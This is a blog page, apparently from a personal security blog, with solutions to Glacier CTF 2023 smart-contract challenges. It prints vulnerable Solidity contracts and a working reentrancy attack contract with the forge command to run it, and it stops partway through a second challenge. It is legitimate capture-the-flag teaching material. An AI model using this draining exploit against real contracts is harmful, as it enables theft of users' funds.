@@ -1,0 +1,973 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Mj0ln1r-Glacier CTF 2023 (Blockchain)</title>
+  <link rel="icon" type="image/x-icon" href="assets/img/favicons/favicon.ico">
+  <link rel="stylesheet" href="/css/main.css">
+  <script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script>
+
+  <!-- <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Glacier CTF 2023 (Blockchain) | Mj0ln1’s Blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="Glacier CTF 2023 (Blockchain)" />
+<meta name="author" content="Mj0ln1" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Hey hi, I played Glacier CTF 2023. I joined with CyberSpace a wonderful team to work with. We got 14th place in this CTF. I am focused on my fav smart contract challenges and solved ALL of them. Let me share those ATTACK scripts here." />
+<meta property="og:description" content="Hey hi, I played Glacier CTF 2023. I joined with CyberSpace a wonderful team to work with. We got 14th place in this CTF. I am focused on my fav smart contract challenges and solved ALL of them. Let me share those ATTACK scripts here." />
+<link rel="canonical" href="http://localhost:4000/posts/glacierctf23" />
+<meta property="og:url" content="http://localhost:4000/posts/glacierctf23" />
+<meta property="og:site_name" content="Mj0ln1’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-11-27T00:00:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Glacier CTF 2023 (Blockchain)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Mj0ln1","url":"https://themj0ln1r.github.io"},"dateModified":"2023-11-27T00:00:00+05:30","datePublished":"2023-11-27T00:00:00+05:30","description":"Hey hi, I played Glacier CTF 2023. I joined with CyberSpace a wonderful team to work with. We got 14th place in this CTF. I am focused on my fav smart contract challenges and solved ALL of them. Let me share those ATTACK scripts here.","headline":"Glacier CTF 2023 (Blockchain)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/glacierctf23"},"url":"http://localhost:4000/posts/glacierctf23"}</script>
+<!-- End Jekyll SEO tag -->
+ 
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div class="head-parent">
+      <a href="/">
+        <h1>mj0ln1r@home:~$</h1></a>
+        <span id="command">cat GlacierCTF</span>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>Glacier CTF 2023 (Blockchain)</h2>
+  <time datetime="2023-11-27T00:00:00+05:30" class="by-line">27 Nov 2023</time>
+  <p>Hey hi, I played <a href="https://ctftime.org/event/1992" target="_blank">Glacier CTF 2023</a>. I joined with <a href="https://ctftime.org/team/116280" target="_blank">CyberSpace</a> a wonderful team to work with. We got <strong><code class="language-plaintext highlighter-rouge">14th</code></strong> place in this CTF. I am focused on my fav smart contract challenges and solved ALL of them. Let me share those ATTACK scripts here.</p>
+
+<h1 id="smart-contracts">Smart Contracts</h1>
+
+<p><img src="/assets/img/post_img/glacierctf23_progress.png" class="autoimg" /></p>
+
+<p>Clone my solution repository to follow along</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/TheMj0ln1r/GlacierCTF23Solves.git
+</code></pre></div></div>
+
+<h2 id="glaciercoin-68pts">GlacierCoin [68pts]</h2>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Description :
+
+"You start your journey up the glacier, to get to new heights (maybe even the moon). To get up the first part of the glacie you will need a guide to help you. The cheapest guide that you find charges you 1000 glacier coins, but unfortunately you only have 10. Find a way to pay the guide. To get the ticket, run solve-pow.py"
+
+author: J4X
+
+nc chall.glacierctf.com 13372
+
+Attached Files : [Challenge.sol, Setup.sol, solve-pow.py]
+</code></pre></div></div>
+
+<blockquote>
+  <p>Note : solve-pow.py is just a pow script which generates a ticket for solver which used to deploy our challenge instance using <code class="language-plaintext highlighter-rouge">nc chall.glacierctf.com 13372</code></p>
+</blockquote>
+
+<p><code class="language-plaintext highlighter-rouge">Setup.sol</code></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="c1">// SPDX-License-Identifier: MIT</span>
+<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+
+<span class="k">import</span> <span class="dl">"</span><span class="s2">./Challenge.sol</span><span class="dl">"</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">Setup</span> <span class="p">{</span>
+    <span class="nx">GlacierCoin</span> <span class="kr">public</span> <span class="nx">immutable</span> <span class="nx">TARGET</span><span class="p">;</span> <span class="c1">// Contract the player will hack</span>
+
+    <span class="nf">constructor</span><span class="p">()</span> <span class="nx">payable</span> <span class="p">{</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span> <span class="o">==</span> <span class="mi">100</span> <span class="nx">ether</span><span class="p">);</span>
+
+        <span class="c1">// Deploy the victim contract</span>
+        <span class="nx">TARGET</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">GlacierCoin</span><span class="p">();</span>
+
+        <span class="c1">// Send 10 ether to the victim contract as initial balance</span>
+        <span class="nx">TARGET</span><span class="p">.</span><span class="nx">buy</span><span class="p">{</span><span class="nl">value</span><span class="p">:</span> <span class="mi">10</span> <span class="nx">ether</span><span class="p">}();</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Our challenge in the CTF framework will call this function to</span>
+    <span class="c1">// check whether the player has solved the challenge or not.</span>
+    <span class="kd">function</span> <span class="nf">isSolved</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nf">address</span><span class="p">(</span><span class="nx">TARGET</span><span class="p">).</span><span class="nx">balance</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">Challenge.sol</code></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="c1">// SPDX-License-Identifier: MIT</span>
+<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">18</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">GlacierCoin</span>
+<span class="p">{</span>
+    <span class="nx">address</span> <span class="nx">owner</span><span class="p">;</span>
+    <span class="nf">mapping</span><span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">uint</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">balances</span><span class="p">;</span>
+    <span class="nf">mapping</span><span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">uint</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">frozen</span><span class="p">;</span>
+    <span class="nf">constructor</span><span class="p">()</span> 
+    <span class="p">{</span>
+        <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="c1">//This is the function you need to call to buy tokens</span>
+    <span class="kd">function</span> <span class="nf">buy</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span>
+    <span class="p">{</span>
+        <span class="nf">_mint</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">,</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="c1">//This is the function you need to call to burn tokens</span>
+    <span class="kd">function</span> <span class="nf">burn</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">amount</span><span class="p">)</span> <span class="kr">public</span>
+    <span class="p">{</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="nx">amount</span><span class="p">,</span> <span class="dl">"</span><span class="s2">You can not burn this much as you are poor af</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="nx">amount</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="c1">//This is a even cooler contract than ERC20 you can not only burn, but also freeze your token. </span>
+    <span class="kd">function</span> <span class="nf">freeze</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">amount</span><span class="p">)</span> <span class="kr">public</span>
+    <span class="p">{</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="nx">amount</span><span class="p">,</span> <span class="dl">"</span><span class="s2">You can not freeze this much as you are poor af</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nx">frozen</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">+=</span> <span class="nx">amount</span><span class="p">;</span>
+        <span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="nx">amount</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="c1">//You can even unfreeze your token, but you can only unfreeze as much as you have frozen</span>
+    <span class="kd">function</span> <span class="nf">defrost</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">amount</span><span class="p">)</span> <span class="kr">public</span>
+    <span class="p">{</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nx">frozen</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="nx">amount</span><span class="p">,</span> <span class="dl">"</span><span class="s2">You can not unfreeze this much</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nx">frozen</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="nx">amount</span><span class="p">;</span>
+        <span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">+=</span> <span class="nx">amount</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="c1">//You can even sell your token for ether, but you can only sell as much as you have</span>
+    <span class="kd">function</span> <span class="nf">sell</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">amount</span><span class="p">)</span> <span class="kr">public</span>
+    <span class="p">{</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="nx">amount</span><span class="p">,</span> <span class="dl">"</span><span class="s2">You can not sell this much as you are poor af</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nx">uint256</span> <span class="nx">new_balance</span> <span class="o">=</span> <span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">-</span> <span class="nx">amount</span><span class="p">;</span>
+        <span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">).</span><span class="nx">call</span><span class="p">{</span><span class="nl">value</span><span class="p">:</span> <span class="nx">amount</span><span class="p">}(</span><span class="dl">""</span><span class="p">);</span>
+        <span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span> <span class="o">=</span> <span class="nx">new_balance</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="c1">//Internal functions (These shouldn't interest you)</span>
+    <span class="kd">function</span> <span class="nf">_mint</span><span class="p">(</span><span class="nx">uint256</span> <span class="nx">amount</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">target</span><span class="p">)</span> <span class="nx">internal</span>
+    <span class="p">{</span>
+        <span class="nx">balances</span><span class="p">[</span><span class="nx">target</span><span class="p">]</span> <span class="o">+=</span> <span class="nx">amount</span><span class="p">;</span>
+    <span class="p">}</span>   
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>Observations :</p>
+
+<ol>
+  <li>We are given with setup contract address</li>
+  <li>Setup contract deployes the GlacierCoin contract and funds with 10 ether</li>
+  <li>GlacierCoin is a non-standard token contracts with buy, sell, freeze features</li>
+</ol>
+
+<p>Goal :</p>
+
+<ul>
+  <li>The goal is to make the GlacierCoin balance 0 (look at isSolved() in Setup)</li>
+</ul>
+
+<p>We can simply look at the <code class="language-plaintext highlighter-rouge">sell()</code> function which is susceptable to the great <code class="language-plaintext highlighter-rouge">Reentrancy</code>. The balance of the sender updated after the external call. So, we can simply write an Attack contract with a fallback function <code class="language-plaintext highlighter-rouge">Reenter</code> into the <code class="language-plaintext highlighter-rouge">sell()</code> function.</p>
+
+<p>Attack :</p>
+
+<ol>
+  <li>Buy 10 coins in GlacierCoin with 10 ether</li>
+  <li>Sell it back</li>
+  <li>Reenter into sell again from fallback</li>
+</ol>
+
+<p><code class="language-plaintext highlighter-rouge">Attack.s.sol</code> :</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
+<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">18</span><span class="p">;</span>
+<span class="k">import</span> <span class="p">{</span><span class="nx">Setup</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/GlacierCoin/Setup.sol</span><span class="dl">"</span><span class="p">;</span>
+<span class="k">import</span> <span class="p">{</span><span class="nx">GlacierCoin</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/GlacierCoin/Challenge.sol</span><span class="dl">"</span><span class="p">;</span>
+<span class="k">import</span> <span class="p">{</span><span class="nx">Script</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
+<span class="k">import</span> <span class="p">{</span><span class="nx">console</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">AttackScript</span> <span class="nx">is</span> <span class="nx">Script</span><span class="p">{</span>
+    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="kr">public</span><span class="p">{</span>
+        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">();</span>
+        <span class="k">new</span> <span class="nx">Attack</span><span class="p">{</span><span class="nl">value</span><span class="p">:</span> <span class="mi">20</span> <span class="nx">ether</span><span class="p">}().</span><span class="nf">exploit</span><span class="p">();</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Attack Success</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nx">contract</span> <span class="nx">Attack</span><span class="p">{</span>
+    <span class="nx">Setup</span> <span class="kr">public</span> <span class="nx">setupContract</span> <span class="o">=</span> <span class="nc">Setup</span><span class="p">(</span><span class="mh">0x1163C62DE50f6f148e3deA99cA65EBAff3fab967</span><span class="p">);</span>
+    <span class="nx">GlacierCoin</span> <span class="kr">public</span> <span class="nx">TARGET</span> <span class="o">=</span> <span class="nc">GlacierCoin</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">setupContract</span><span class="p">.</span><span class="nc">TARGET</span><span class="p">()));</span>
+    <span class="nf">constructor</span><span class="p">()</span> <span class="nx">payable</span> <span class="p">{</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span> <span class="o">==</span> <span class="mi">20</span> <span class="nx">ether</span><span class="p">);</span> <span class="c1">// For attack contract usage</span>
+    <span class="p">}</span>
+    <span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="kr">public</span><span class="p">{</span>
+        <span class="nx">TARGET</span><span class="p">.</span><span class="nx">buy</span><span class="p">{</span><span class="nl">value</span><span class="p">:</span> <span class="mi">10</span> <span class="nx">ether</span><span class="p">}();</span>
+        <span class="nx">TARGET</span><span class="p">.</span><span class="nf">sell</span><span class="p">(</span><span class="mi">10</span> <span class="nx">ether</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="nf">fallback</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="p">{</span> 
+        <span class="nx">TARGET</span><span class="p">.</span><span class="nf">sell</span><span class="p">(</span><span class="mi">10</span> <span class="nx">ether</span><span class="p">);</span>    
+    <span class="p">}</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>Run the following command to solve the challenge.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>forge script script/GlacierCoinAttack.s.sol:AttackScript <span class="nt">--rpc-url</span> &lt;RPC-URL&gt; <span class="nt">--private-key</span> &lt;REDACTED&gt; <span class="nt">--broadcast</span>
+</code></pre></div></div>
+
+<h2 id="glaciervault-316pts">GlacierVault [316pts]</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Description :
+
+"Ascending the glacier under the guidance of your seasoned expedition leader, you encounter a breathtaking sight: a vault intricately carved into the ice, its entrance guarded by a formidable sentinel. This ancient guardian stands watch, an imposing figure resolute in its duty. To gain access to the enigmatic vault and its concealed treasures, you must devise a clever strategy to lull the guardian into a deep, peaceful slumber, a challenge that awaits your resourcefulness and cunning. To get the ticket, run solve-pow.py"
+
+author: J4X
+
+nc chall.glacierctf.com 13377
+
+Attached Files : [GlacierVault.sol, Guardian.sol, Setup.sol]
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">Setup.sol</code></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
+<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+
+<span class="k">import</span> <span class="dl">"</span><span class="s2">./GlacierVault.sol</span><span class="dl">"</span><span class="p">;</span>
+<span class="k">import</span> <span class="dl">"</span><span class="s2">./Guardian.sol</span><span class="dl">"</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">Setup</span> <span class="p">{</span>
+    <span class="nx">Guardian</span> <span class="kr">public</span> <span class="nx">immutable</span> <span class="nx">TARGET</span><span class="p">;</span> <span class="c1">// Contract the player will hack</span>
+    <span class="nf">constructor</span><span class="p">()</span> <span class="nx">payable</span> <span class="p">{</span>
+        <span class="c1">// Deploy the victim contract</span>
+        <span class="nx">GlacierVault</span> <span class="nx">vault</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">GlacierVault</span><span class="p">();</span>
+        <span class="c1">// Deploy the guardian contract</span>
+        <span class="nx">TARGET</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Guardian</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">vault</span><span class="p">));</span>
+    <span class="p">}</span>
+    <span class="c1">// Our challenge in the CTF framework will call this function to</span>
+    <span class="c1">// check whether the player has solved the challenge or not.</span>
+    <span class="kd">function</span> <span class="nf">isSolved</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nx">TARGET</span><span class="p">.</span><span class="nf">asleep</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">Guardian.sol</code></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
+<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">18</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">Guardian</span>
+<span class="p">{</span>
+    <span class="nx">bool</span> <span class="kr">public</span> <span class="nx">asleep</span><span class="p">;</span>
+    <span class="nx">address</span> <span class="kr">public</span> <span class="nx">implementation_addr</span><span class="p">;</span>
+    <span class="nx">uint256</span> <span class="nx">people_mauled</span><span class="p">;</span>
+    <span class="nx">address</span> <span class="kr">public</span> <span class="nx">owner</span><span class="p">;</span>
+
+    <span class="nx">event</span> <span class="nf">putToSleepCall</span><span class="p">(</span><span class="nx">address</span><span class="p">,</span> <span class="nx">address</span><span class="p">);</span>
+
+    <span class="nf">constructor</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_implementation_addr</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="nx">asleep</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+        <span class="nx">implementation_addr</span> <span class="o">=</span> <span class="nx">_implementation_addr</span><span class="p">;</span>
+        <span class="nx">owner</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
+        <span class="nx">people_mauled</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nf">putToSleep</span><span class="p">()</span> <span class="nx">external</span>
+    <span class="p">{</span>
+        <span class="nx">emit</span> <span class="nf">putToSleepCall</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span> <span class="nx">owner</span><span class="p">);</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">==</span> <span class="nx">owner</span><span class="p">,</span> <span class="dl">"</span><span class="s2">You can't do that. The yeti mauls you.</span><span class="dl">"</span><span class="p">);</span>
+        <span class="nx">asleep</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nf">punch</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span>
+    <span class="p">{</span>
+        <span class="nf">if </span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="nx">_000_000</span> <span class="nx">ether</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="nx">asleep</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">else</span>
+        <span class="p">{</span>
+            <span class="nx">people_mauled</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nf">_delegate</span><span class="p">(</span><span class="nx">address</span> <span class="nx">implementation</span><span class="p">)</span> <span class="nx">internal</span> <span class="p">{</span>
+        <span class="nx">assembly</span> <span class="p">{</span>
+            <span class="c1">// Copy msg.data. We take full control of memory in this inline assembly</span>
+            <span class="c1">// block because it will not return to Solidity code. We overwrite the</span>
+            <span class="c1">// Solidity scratch pad at memory position 0.</span>
+            <span class="nf">calldatacopy</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nf">calldatasize</span><span class="p">())</span>
+
+            <span class="c1">// Call the implementation.</span>
+            <span class="c1">// out and outsize are 0 because we don't know the size yet.</span>
+            <span class="kd">let</span> <span class="nx">result</span> <span class="p">:</span><span class="o">=</span> <span class="nf">delegatecall</span><span class="p">(</span><span class="nf">gas</span><span class="p">(),</span> <span class="nx">implementation</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nf">calldatasize</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+
+            <span class="c1">// Copy the returned data.</span>
+            <span class="nf">returndatacopy</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nf">returndatasize</span><span class="p">())</span>
+
+            <span class="k">switch</span> <span class="nx">result</span>
+            <span class="c1">// delegatecall returns 0 on error.</span>
+            <span class="k">case</span> <span class="mi">0</span> <span class="p">{</span>
+                <span class="nf">revert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">returndatasize</span><span class="p">())</span>
+            <span class="p">}</span>
+            <span class="k">default</span> <span class="p">{</span>
+                <span class="nf">return</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">returndatasize</span><span class="p">())</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="cm">/**
+     * @dev This is a virtual function that should be overridden so it returns the address to which the fallback function
+     * and {_fallback} should delegate.
+     */</span>
+    <span class="kd">function</span> <span class="nf">_implementation</span><span class="p">()</span> <span class="nx">internal</span> <span class="nx">view</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">address</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="nx">implementation_addr</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="cm">/**
+     * @dev Delegates the current call to the address returned by `_implementation()`.
+     *
+     * This function does not return to its internal call site, it will return directly to the external caller.
+     */</span>
+    <span class="kd">function</span> <span class="nf">_fallback</span><span class="p">()</span> <span class="nx">internal</span> <span class="p">{</span>
+        <span class="nf">_beforeFallback</span><span class="p">();</span>
+        <span class="nf">_delegate</span><span class="p">(</span><span class="nf">_implementation</span><span class="p">());</span>
+    <span class="p">}</span>
+
+    <span class="cm">/**
+     * @dev Fallback function that delegates calls to the address returned by `_implementation()`. Will run if no other
+     * function in the contract matches the call data.
+     */</span>
+    <span class="nf">fallback</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="p">{</span>
+        <span class="nf">_fallback</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="cm">/**
+     * @dev Hook that is called before falling back to the implementation. Can happen as part of a manual `_fallback`
+     * call, or as part of the Solidity `fallback` or `receive` functions.
+     *
+     * If overridden should call `super._beforeFallback()`.
+     */</span>
+    <span class="kd">function</span> <span class="nf">_beforeFallback</span><span class="p">()</span> <span class="nx">internal</span> <span class="p">{}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">GlacierVault.sol</code></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
+<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">18</span><span class="p">;</span>
+
+<span class="nx">contract</span> <span class="nx">GlacierVault</span>
+<span class="p">{</span>
+    <span class="nf">mapping</span><span class="p">(</span><span class="nx">uint256</span> <span class="o">=&gt;</span> <span class="nx">address</span><span class="p">)</span> <span class="nx">slot_owners</span><span class="p">;</span>
+    <span class="nf">mapping</span><span class="p">(</span><span class="nx">uint256</span> <span class="o">=&gt;</span> <span class="nx">string</span><span class="p">)</span> <span class="kr">private</span> <span class="nx">slots</span><span class="p">;</span>
+    <span class="nx">uint256</span> <span class="nx">quickstore1</span><span class="p">;</span>
+    <span class="nx">uint256</span> <span class="nx">quickstore2</span><span class="p">;</span>
+    <span class="nx">uint256</span> <span class="nx">quickstore3</span><span class="p">;</span>
+    <span class="nx">uint256</span> <span class="nx">quickstore4</span><span class="p">;</span>
+    <span class="nx">uint256</span> <span class="nx">quickstore5</span><span class="p">;</span>
+
+    <span class="c1">// You can use this vault to store your strings forever </span>
+    <span class="kd">function</span> <span class="nf">store</span><span class="p">(</span><span class="nx">string</span> <span class="nx">memory</span> <span class="nx">item</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">slot_index</span><span class="p">)</span> <span class="nx">payable</span> <span class="kr">public</span>
+    <span class="p">{</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span> <span class="o">==</span> <span class="mi">1337</span><span class="p">);</span>
+        <span class="nf">require</span><span class="p">(</span><span class="nx">slot_owners</span><span class="p">[</span><span class="nx">slot_index</span><span class="p">]</span> <span class="o">==</span> <span class="nf">address</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">||</span> <span class="nx">slot_owners</span><span class="p">[</span><span class="nx">slot_index</span><span class="p">]</span> <span class="o">==</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span> <span class="dl">"</span><span class="s2">this store is already used by someone else</span><span class="dl">"</span><span class="p">);</span>
+
+        <span class="nx">slots</span><span class="p">[</span><span class="nx">slot_index</span><span class="p">]</span> <span class="o">=</span> <span class="nx">item</span><span class="p">;</span>
+        <span class="nx">slot_owners</span><span class="p">[</span><span class="nx">slot_index</span><span class="p">]</span> <span class="o">=</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
+    <span class="p">}</span>
+
